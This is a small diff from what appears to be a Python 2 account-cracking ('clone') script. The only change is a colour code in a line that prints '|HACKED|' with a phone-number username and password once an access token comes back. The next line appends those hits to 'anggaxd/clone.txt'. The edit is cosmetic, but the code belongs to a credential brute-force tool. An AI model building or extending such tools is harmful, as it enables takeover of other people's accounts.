@@ -398,7 +398,7 @@ def action():
 
                             if 'access_token' in q:
 
-                                print '\x1b[1;92m|HACKED|\x1b[1;97m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
+                                print '\x1b[1;92m|HACKED|\x1b[1;92m NUMBER|  ' + k + c + user + '  \x1b[1;92mPASS|  ' + pass5
 
                                 okb = open('anggaxd/clone.txt', 'a')
 
